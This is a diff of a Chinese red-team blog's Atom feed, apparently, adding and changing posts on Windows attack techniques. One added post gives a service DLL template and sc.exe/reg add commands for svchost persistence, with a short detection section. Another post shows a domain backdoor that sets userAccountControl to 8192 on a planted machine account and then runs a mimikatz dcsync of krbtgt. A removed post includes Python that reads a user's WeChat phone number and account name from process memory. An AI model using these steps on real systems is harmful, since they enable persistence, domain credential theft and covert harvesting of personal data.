@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2022-01-15T17:25:10.951Z</updated>
+  <updated>2022-01-15T17:35:56.075Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,33 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>svchost.exe挂载DLL</title>
+    <link href="http://422926799.github.io/posts/3047149d.html"/>
+    <id>http://422926799.github.io/posts/3047149d.html</id>
+    <published>2022-01-15T17:28:39.000Z</published>
+    <updated>2022-01-15T17:35:56.075Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p><img src="https://s4.ax1x.com/2022/01/16/7YH6o9.png" alt=""></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>vs新建类库编译个处理服务循环响用的DLL</p><pre><code>#include &quot;pch.h&quot;#define SVCNAME TEXT(&quot;EvilSvc&quot;)SERVICE_STATUS serviceStatus;SERVICE_STATUS_HANDLE serviceStatusHandle;HANDLE stopEvent = NULL;VOID UpdateServiceStatus(DWORD currentState){    serviceStatus.dwCurrentState = currentState;    SetServiceStatus(serviceStatusHandle, &amp;serviceStatus);}DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context){    switch (controlCode)    {        case SERVICE_CONTROL_STOP:            serviceStatus.dwCurrentState = SERVICE_STOPPED;            SetEvent(stopEvent);            break;        case SERVICE_CONTROL_SHUTDOWN:            serviceStatus.dwCurrentState = SERVICE_STOPPED;            SetEvent(stopEvent);            break;        case SERVICE_CONTROL_PAUSE:            serviceStatus.dwCurrentState = SERVICE_PAUSED;            break;        case SERVICE_CONTROL_CONTINUE:            serviceStatus.dwCurrentState = SERVICE_RUNNING;            break;        case SERVICE_CONTROL_INTERROGATE:            break;        default:            break;    }    UpdateServiceStatus(SERVICE_RUNNING);    return NO_ERROR;}VOID ExecuteServiceCode(){    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);    UpdateServiceStatus(SERVICE_RUNNING);    // #####################################    // your persistence code here    // #####################################    while (1)    {        WaitForSingleObject(stopEvent, INFINITE);        UpdateServiceStatus(SERVICE_STOPPED);        return;    }}extern &quot;C&quot; __declspec(dllexport) VOID WINAPI ServiceMain(DWORD argC, LPWSTR * argV){    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;    serviceStatus.dwServiceSpecificExitCode = 0;    UpdateServiceStatus(SERVICE_START_PENDING);    ExecuteServiceCode();}</code></pre><p>创建EvilSvc服务</p><pre><code>sc.exe create EvilSvc binPath= &quot;c:\windows\System32\svchost.exe -k DcomLaunch&quot; type= share start= auto</code></pre><p>修改EvilSvc DLL路径为自己的DLL路径</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\Windows\system32\EvilSvc.dll /f</code></pre><p>注册表查看该服务如下<br><img src="https://s4.ax1x.com/2022/01/16/7YHWz6.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YH4sO.png" alt=""></p><p>修改svchost组里的DcomLaunch<br>（添加创建的服务名）<br><img src="https://s4.ax1x.com/2022/01/16/7YH5LD.png" alt=""></p><p>启动EvilSvc服务</p><pre><code>sc start EvilSvc</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHoee.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YH7od.png" alt=""></p><p>检测技术</p><pre><code>* 最近创建的服务svchost.exe作为binPath* 列出所有系统服务的ServiceDLL值并检测</code></pre><pre><code>Get-ItemProperty hklm:\SYSTEM\ControlSet001\Services\*\Parameters | ? { $_.servicedll } | select psparentpath, servicedll</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHXSP.png" alt=""></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;工作原理&quot;&gt;&lt;a href=&quot;#工作原理&quot; class=&quot;headerlink&quot; title=&quot;工作原理&quot;&gt;&lt;/a&gt;工作原理&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://s4.ax1x.com/2022/01/16/7YH6o9.png&quot; alt=&quot;&quot;&gt;&lt;/</summary>
+      
+    
+    
+    
+    
+    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
+    
+  </entry>
+  
+  <entry>
     <title>userAccountControl将ID设置为8192作为后门</title>
     <link href="http://422926799.github.io/posts/a984f0cd.html"/>
     <id>http://422926799.github.io/posts/a984f0cd.html</id>
     <published>2022-01-15T17:02:29.000Z</published>
-    <updated>2022-01-15T17:25:10.951Z</updated>
+    <updated>2022-01-15T17:25:17.889Z</updated>
     
     <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>来源推特：<br><img src="https://s4.ax1x.com/2022/01/16/7YTx9P.png" alt=""></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>YAYI.local - Windows Server 2012 - DC<br>YAYI.local - Windows 7 - 域机器(WIN-BMIO66D4K15)</p><p>在域控机器执行</p><pre><code>powershell下运行如果要在非DC下执行需要执行命令:Import-Module Microsoft.ActiveDirectory.Management.dll #导入Microsoft.ActiveDirectory.Management.dll#添加机器账户New-ADComputer -Name ATTACKER10 -AccountPassword (ConvertTo-SecureString -String &quot;Hjk123456!&quot; -Force -AsPlainText)#设置机器账户的userAccountControl (需要域管权限)$ADComputer=Get-ADComputer -Identity ATTACKER10Set-ADObject -Identity $ADComputer -Replace @{userAccountControl=8192}#查询域DC机器Get-ADGroupMember -Identity &quot;Domain Controllers&quot;</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHPxK.png" alt=""></p><p>域内机器执行dcsync dump</p><pre><code>(需要等待几分钟)mimikatz:lsadump::dcsync /user:krbtgt</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHeIA.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/16/7YHlM8.png" alt=""></p>]]></content>
     
@@ -441,28 +463,6 @@
     
     
     <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>读取微信内存里的信息</title>
-    <link href="http://422926799.github.io/posts/26c63b49.html"/>
-    <id>http://422926799.github.io/posts/26c63b49.html</id>
-    <published>2021-07-20T16:34:51.000Z</published>
-    <updated>2021-07-20T16:55:42.790Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接:<a href="https://blog.csdn.net/weixin_30230009/article/details/105100181" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30230009/article/details/105100181</a><br>需要了解知识：<br>基址 -&gt; 基址在程序下次运行时是不会改变的<br>-&gt;每次重启进程，模块加载的地址会变</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>寻找对应的信息基本方法如下:<br>打开CE附加微信进程，搜索微信号等关键字，然后找到基址 （绿色的就是），双击添加到地址列表<br><img src="https://z3.ax1x.com/2021/07/21/WU1snP.png" alt=""></p><p>PS：这里重启了几次wx，所以CE里的地址和上图对不上 (一开始忘记截了)<br>对着地址双击就能看到对应的地址<br><img src="https://z3.ax1x.com/2021/07/21/WU1y0f.png" alt=""></p><p>然后OD定位到对应的内存地址去查询<br>command: dd <address><br>可以看到开头就是微信号 （打码的手机号）等信息<br><img src="https://z3.ax1x.com/2021/07/21/WU1678.png" alt=""></address></p><p>我们只需要知道基址然后：模块加载地址+基址</p><p>怎么求基址-&gt;偏移地址-dll加载地址=基址<br>这里求手机号基址为例，在od鼠标在内存窗口单机刚刚找到的那个地址点击手机号第一个数字，然后记录下地址，在CE手动添加地址里面输入，类型选字符串<br>即可看见手机号（手机号长度11所以长度设置11）<br><img src="https://z3.ax1x.com/2021/07/21/WU1h1s.png" alt=""></p><p>dll加载地址，CE点击手动添加地址，输入dll名称，类型选4字节<br><img src="https://z3.ax1x.com/2021/07/21/WU15Xq.png" alt=""></p><p>然后将数值改为十六进制（即可得到地址）<br><img src="https://z3.ax1x.com/2021/07/21/WU1TBV.png" alt=""></p><p>或者你也可以用OD或者Process Explorer里获取加载dll地址<br>（注：这后面截的图与上方地址对不上）<br><img src="https://z3.ax1x.com/2021/07/21/WU177T.png" alt=""></p><p>求出手机号基址<br>53D0F560:手机号内存地址<br>52CC0000:dll加载地址<br>53D0F560-52CC0000=104F560 -&gt; WeChatWin.dll(52CC0000)+104F560=手机号<br><img src="https://z3.ax1x.com/2021/07/21/WU1qNF.png" alt=""></p><p>所以以此类推获取：微信号、微信名称等基址<br>WeChatWin.dll+104F52C - wx名<br>WeChatWin.dll+104F690 - wx号地址<br>WeChatWin.dll+104F560 - 手机号</p><p>（找到信息的时候可以切成地址，然后往下滑）<br><img src="https://z3.ax1x.com/2021/07/21/WU1X9J.png" alt=""></p><p>注意事项：遇到指针的话，先获取指针里的值。然后在用这个值当作地址找<br>在找wx号的时候就遇到了<br>（算出第一个基址后，求别的时候只需要把后面三个数字给替换掉就知道了,emmmmmm）<br><img src="https://z3.ax1x.com/2021/07/21/WU1vcR.png" alt=""></p><p>此时046F35D0里面的地址放着微信号<br>（PS:这里地址微信重启过，和上面的图地址对不上）<br><img src="https://z3.ax1x.com/2021/07/21/WU3Snx.png" alt=""></p><p>构造读取<br>使用的Windows API:OpenProcess、ReadProcessMemory</p><pre><code class="python">from ctypes import *from win32con import *from ctypes.wintypes import *from win32process import (EnumProcessModules,GetModuleFileNameEx)import osCreateToolhelp32Snapshot=windll.Kernel32.CreateToolhelp32SnapshotProcess32First=windll.kernel32.Process32FirstProcess32Next=windll.kernel32.Process32NextOpenProcess = windll.kernel32.OpenProcessReadProcessMemory = windll.kernel32.ReadProcessMemoryCloseHandle = windll.kernel32.CloseHandleTH32CS_SNAPPROCESS=0x00000002TH32CS_SNAPMODULE = 0x00000008MAX_MODULE_NAME32 = 255class PROCESSENTRY32A(Structure): #定义PROCESSENTRY32A类型    _fields_ = [ ( &#39;dwSize&#39; , c_ulong ) ,                 ( &#39;cntUsage&#39; , c_ulong) ,                 ( &#39;th32ProcessID&#39; , c_ulong) ,                 ( &#39;th32DefaultHeapID&#39; , c_size_t) ,                 ( &#39;th32ModuleID&#39; , c_ulong) ,                 ( &#39;cntThreads&#39; , c_ulong) ,                 ( &#39;th32ParentProcessID&#39; , c_ulong) ,                 ( &#39;pcPriClassBase&#39; , c_long) ,                 ( &#39;dwFlags&#39; , c_ulong) ,                 ( &#39;szExeFile&#39; , c_char * MAX_PATH ) ]def getprocess_pid(processname):    processimage=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)    pe32=PROCESSENTRY32A()    pe32.dwSize=sizeof(PROCESSENTRY32A)    ret=Process32First(processimage,pointer(pe32))    while ret:        if pe32.szExeFile.decode()==processname:            return pe32.th32ProcessID        ret=Process32Next(processimage,pointer(pe32))def getmodule_address(handle,dllname):    for module in EnumProcessModules(handle):        dllpath=GetModuleFileNameEx(handle,module)        print(module,dllpath)def main():    wetchatwindlladdress=0x63B60000 #枚举WetChatWin.dll加载地址失败，就直接手动定义了    phome = create_string_buffer(11)    wxname=create_string_buffer(20)    wxnumber=c_int(20)    number=create_string_buffer(20)    pid=getprocess_pid(&quot;WeChatStore.exe&quot;)    print(&quot;WeChat PID:{}&quot;.format(pid))    process=OpenProcess(PROCESS_ALL_ACCESS,False,pid)    ReadProcessMemory(process,wetchatwindlladdress+0x104F560,byref(phome),11,None)    ReadProcessMemory(process,wetchatwindlladdress+0x104F52C,byref(wxname),20,None)    ReadProcessMemory(process,wetchatwindlladdress+0x104F690,byref(wxnumber),20,None)    print(&quot;WX Phome:&quot;+hex(wetchatwindlladdress + 0x104F560),phome.value.decode())    print(&quot;WX Name:&quot;+hex(wetchatwindlladdress+0x104F52C),wxname.value.decode())    wxnumberaddress=wxnumber.value #可以不用转十六进制，直接十进制即可,py转十六进制默认是str类型。。hex函数转后填进地址读不到    ReadProcessMemory(process,wxnumberaddress,byref(number),20,None)    print(&quot;WX Number:&quot;+number.value.decode())    #getmodule_address(handle,&quot;WeChatWin.dll&quot;)if __name__ == &#39;__main__&#39;:    main()</code></pre><p><img src="https://z3.ax1x.com/2021/07/21/WU3PAO.png" alt=""></p><p>踩坑记录：</p><pre><code>* 调用EnumProcess和用Thread32First枚举模块，结果根本不能完全枚举。原本想模仿Process Explorer调用ZwQueryVirtualMemory函数枚举模块，py写起来太麻烦。。算了</code></pre><p>这种方法也可以用来干别</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考链接:&lt;a href=&quot;https://blog.csdn.net/weixin_30230009/article/details/10</summary>
-      
-    
-    
-    
-    
-    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
     
   </entry>
   
